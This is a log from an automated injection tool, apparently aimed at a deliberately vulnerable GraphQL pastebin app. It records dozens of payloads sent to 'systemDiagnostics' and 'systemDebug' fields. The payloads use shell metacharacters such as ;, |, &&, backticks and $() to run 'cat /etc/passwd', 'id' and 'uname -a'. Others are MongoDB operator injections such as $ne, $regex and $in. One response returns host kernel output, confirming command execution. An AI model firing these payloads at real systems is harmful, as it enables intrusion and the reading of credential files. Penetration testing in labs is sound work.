2026-02-03 20:06:25,455 | INFO    | GraphQLClient        | -                              | introspection        | POST | success  |  0.514s | payload=[__schema] response=[{"data": {"__schema": {"queryType": {"name": "Query", "fields": [{"name": "pastes", "args": [{"name": "public", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}, {"name": "limit", "type"…]
2026-02-03 20:28:55,945 | INFO    | InjectionTester      | pipe_cat_passwd                | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[|cat /etc/passwd] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:55,959 | INFO    | InjectionTester      | double_pipe_cat_passwd         | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[||cat /etc/passwd] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:55,971 | INFO    | InjectionTester      | and_cat_passwd                 | systemDiagnostics.cmd | POST | success  |  0.012s | payload=[&& cat /etc/passwd] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:55,985 | INFO    | InjectionTester      | semicolon_uname                | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[;uname -a] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:55,998 | INFO    | InjectionTester      | pipe_uname                     | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[|uname -a] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:56,010 | INFO    | InjectionTester      | double_pipe_uname              | systemDiagnostics.cmd | POST | success  |  0.012s | payload=[||uname -a] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:56,022 | INFO    | InjectionTester      | and_uname                      | systemDiagnostics.cmd | POST | success  |  0.011s | payload=[&& uname -a] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:56,035 | INFO    | InjectionTester      | backtick_cat_passwd            | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[`cat /etc/passwd`] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:56,050 | INFO    | InjectionTester      | backtick_id                    | systemDiagnostics.cmd | POST | success  |  0.014s | payload=[`id`] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:56,063 | INFO    | InjectionTester      | backtick_uname                 | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[`uname -a`] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:56,078 | INFO    | InjectionTester      | dollar_cat_passwd              | systemDiagnostics.cmd | POST | success  |  0.014s | payload=[$(cat /etc/passwd)] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:56,092 | INFO    | InjectionTester      | dollar_id                      | systemDiagnostics.cmd | POST | success  |  0.014s | payload=[$(id)] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:56,105 | INFO    | InjectionTester      | dollar_uname                   | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[$(uname -a)] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:56,118 | INFO    | InjectionTester      | plain_uname                    | systemDiagnostics.cmd | POST | success  |  0.012s | payload=[uname -a] response=[{"data": {"systemDiagnostics": "Linux e6b627b9a95a 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64 GNU/Linux\n"}}]
2026-02-03 20:28:56,121 | INFO    | InjectionTester      | semicolon_id                   | systemDebug.arg      | POST | success  |  0.003s | payload=[;id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 33}]}]}]
2026-02-03 20:28:56,123 | INFO    | InjectionTester      | pipe_id                        | systemDebug.arg      | POST | success  |  0.002s | payload=[|id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 33}]}]}]
2026-02-03 20:28:56,126 | INFO    | InjectionTester      | double_pipe_id                 | systemDebug.arg      | POST | success  |  0.002s | payload=[||id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 34}]}]}]
2026-02-03 20:28:56,128 | INFO    | InjectionTester      | and_id                         | systemDebug.arg      | POST | success  |  0.002s | payload=[&& id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 35}]}]}]
2026-02-03 20:28:56,131 | INFO    | InjectionTester      | semicolon_cat_passwd           | systemDebug.arg      | POST | success  |  0.003s | payload=[;cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 46}]}]}]
2026-02-03 20:28:56,134 | INFO    | InjectionTester      | pipe_cat_passwd                | systemDebug.arg      | POST | success  |  0.003s | payload=[|cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 46}]}]}]
2026-02-03 20:28:56,137 | INFO    | InjectionTester      | double_pipe_cat_passwd         | systemDebug.arg      | POST | success  |  0.002s | payload=[||cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 47}]}]}]
2026-02-03 20:28:56,140 | INFO    | InjectionTester      | and_cat_passwd                 | systemDebug.arg      | POST | success  |  0.002s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 48}]}]}]
2026-02-03 20:28:56,142 | INFO    | InjectionTester      | semicolon_uname                | systemDebug.arg      | POST | success  |  0.002s | payload=[;uname -a] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 39}]}]}]
2026-02-03 20:28:56,145 | INFO    | InjectionTester      | pipe_uname                     | systemDebug.arg      | POST | success  |  0.002s | payload=[|uname -a] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 39}]}]}]
2026-02-03 20:28:56,147 | INFO    | InjectionTester      | double_pipe_uname              | systemDebug.arg      | POST | success  |  0.002s | payload=[||uname -a] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 40}]}]}]
2026-02-03 20:28:56,150 | INFO    | InjectionTester      | and_uname                      | systemDebug.arg      | POST | success  |  0.002s | payload=[&& uname -a] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 41}]}]}]
2026-02-03 20:28:56,152 | INFO    | InjectionTester      | backtick_cat_passwd            | systemDebug.arg      | POST | success  |  0.002s | payload=[`cat /etc/passwd`] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 47}]}]}]
2026-02-03 20:28:56,155 | INFO    | InjectionTester      | backtick_id                    | systemDebug.arg      | POST | success  |  0.002s | payload=[`id`] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 34}]}]}]
2026-02-03 20:28:56,157 | INFO    | InjectionTester      | backtick_uname                 | systemDebug.arg      | POST | success  |  0.002s | payload=[`uname -a`] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 40}]}]}]
2026-02-03 20:28:56,160 | INFO    | InjectionTester      | dollar_cat_passwd              | systemDebug.arg      | POST | success  |  0.002s | payload=[$(cat /etc/passwd)] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 48}]}]}]
2026-02-03 20:28:56,163 | INFO    | InjectionTester      | dollar_id                      | systemDebug.arg      | POST | success  |  0.002s | payload=[$(id)] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 35}]}]}]
2026-02-03 20:28:56,165 | INFO    | InjectionTester      | dollar_uname                   | systemDebug.arg      | POST | success  |  0.002s | payload=[$(uname -a)] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 41}]}]}]
2026-02-03 20:28:56,168 | INFO    | InjectionTester      | plain_uname                    | systemDebug.arg      | POST | success  |  0.002s | payload=[uname -a] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 38}]}]}]
2026-02-03 20:28:56,170 | INFO    | InjectionTester      | chain_semicolon                | systemDebug.arg      | POST | success  |  0.002s | payload=[;cat /etc/passwd;id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 49}]}]}]
2026-02-03 20:28:56,173 | INFO    | InjectionTester      | chain_pipe                     | systemDebug.arg      | POST | success  |  0.002s | payload=[|cat /etc/passwd|id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 49}]}]}]
2026-02-03 20:28:56,175 | INFO    | InjectionTester      | chain_and                      | systemDebug.arg      | POST | success  |  0.002s | payload=[&&cat /etc/passwd&&id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 51}]}]}]
2026-02-03 20:28:56,178 | INFO    | InjectionTester      | plain_cat_passwd               | systemDebug.arg      | POST | success  |  0.002s | payload=[cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 45}]}]}]
2026-02-03 20:28:56,180 | INFO    | InjectionTester      | space_semicolon_cat            | systemDebug.arg      | POST | success  |  0.002s | payload=[; cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 47}]}]}]
2026-02-03 20:28:56,183 | INFO    | InjectionTester      | space_pipe_cat                 | systemDebug.arg      | POST | success  |  0.002s | payload=[| cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 47}]}]}]
2026-02-03 20:28:56,186 | INFO    | InjectionTester      | space_and_cat                  | systemDebug.arg      | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 48}]}]}]
2026-02-03 20:28:56,188 | INFO    | InjectionTester      | mongo_ne_operator              | systemDebug.arg      | POST | success  |  0.002s | payload=[{"$ne": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:29) Expected Name, found $\n\n1: query { systemDebug(arg: \"{\"$ne\": \"\"}\") { id message error success } }\n                               ^\n", "lo…]
2026-02-03 20:28:56,190 | INFO    | InjectionTester      | mongo_gt_operator              | systemDebug.arg      | POST | success  |  0.002s | payload=[{"$gt": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:29) Expected Name, found $\n\n1: query { systemDebug(arg: \"{\"$gt\": \"\"}\") { id message error success } }\n                               ^\n", "lo…]
2026-02-03 20:28:56,192 | INFO    | InjectionTester      | mongo_gte_operator             | systemDebug.arg      | POST | success  |  0.002s | payload=[{"$gte": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:29) Expected Name, found $\n\n1: query { systemDebug(arg: \"{\"$gte\": \"\"}\") { id message error success } }\n                               ^\n", "l…]
2026-02-03 20:28:56,194 | INFO    | InjectionTester      | mongo_lt_operator              | systemDebug.arg      | POST | success  |  0.002s | payload=[{"$lt": "~"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:29) Expected Name, found $\n\n1: query { systemDebug(arg: \"{\"$lt\": \"~\"}\") { id message error success } }\n                               ^\n", "l…]
2026-02-03 20:28:56,196 | INFO    | InjectionTester      | mongo_regex_all                | systemDebug.arg      | POST | success  |  0.002s | payload=[{"$regex": ".*"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:29) Expected Name, found $\n\n1: query { systemDebug(arg: \"{\"$regex\": \".*\"}\") { id message error success } }\n                               ^\n"…]
2026-02-03 20:28:56,198 | INFO    | InjectionTester      | mongo_regex_admin              | systemDebug.arg      | POST | success  |  0.002s | payload=[{"$regex": "^admin"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:29) Expected Name, found $\n\n1: query { systemDebug(arg: \"{\"$regex\": \"^admin\"}\") { id message error success } }\n                               …]
2026-02-03 20:28:56,200 | INFO    | InjectionTester      | mongo_in_operator              | systemDebug.arg      | POST | success  |  0.002s | payload=[{"$in": ["admin", "root", "test"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:29) Expected Name, found $\n\n1: query { systemDebug(arg: \"{\"$in\": [\"admin\", \"root\", \"test\"]}\") { id message error success } }\n             …]
2026-02-03 20:28:56,202 | INFO    | InjectionTester      | mongo_nin_operator             | systemDebug.arg      | POST | success  |  0.002s | payload=[{"$nin": ["impossible_value_xyz"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:29) Expected Name, found $\n\n1: query { systemDebug(arg: \"{\"$nin\": [\"impossible_value_xyz\"]}\") { id message error success } }\n                 …]
2026-02-03 20:28:56,204 | INFO    | InjectionTester      | mongo_exists_true              | systemDebug.arg      | POST | success  |  0.002s | payload=[{"$exists": true}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:29) Expected Name, found $\n\n1: query { systemDebug(arg: \"{\"$exists\": true}\") { id message error success } }\n                               ^\n",…]
